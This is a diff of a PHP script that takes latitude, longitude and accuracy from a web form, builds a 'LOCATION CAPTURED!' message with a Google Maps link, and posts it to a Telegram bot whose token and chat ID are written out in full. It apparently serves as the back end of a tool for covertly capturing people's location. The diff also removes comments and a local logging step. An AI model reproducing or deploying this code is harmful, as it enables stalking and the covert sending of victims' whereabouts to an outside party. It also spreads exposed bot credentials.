@@ -1,10 +1,8 @@
 <?php
-// ******************************************
-// CONFIGURATION: PASTE YOUR REAL DETAILS HERE
-// ******************************************
-$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386... token here
-$chatId = "-1003598938463";     // Paste your -100... ID here
-// ******************************************
+
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
+$chatId = "-1003598938463";     
+
 
 // Receive Data
 $lat = $_POST['Lat'];
@@ -20,7 +18,7 @@ $googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;
 
 // Format Message
 $message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
-// Added <code> tags below to make them clickable/copyable
+
 $message .= "<b>🌎 Latitude:</b> <code>" . $lat . "</code>\n";
 $message .= "<b>🌎 Longitude:</b> <code>" . $lon . "</code>\n";
 $message .= "<b>🎯 Accuracy:</b> " . $acc . "\n";
@@ -46,8 +44,5 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 $result = curl_exec($ch);
 curl_close($ch);
-
-// --- SECURE LOGGING ---
-$resFile = '../../logs/result.txt';
-fwrite(fopen($resFile, 'w+'), $message); 
+ 
 ?>
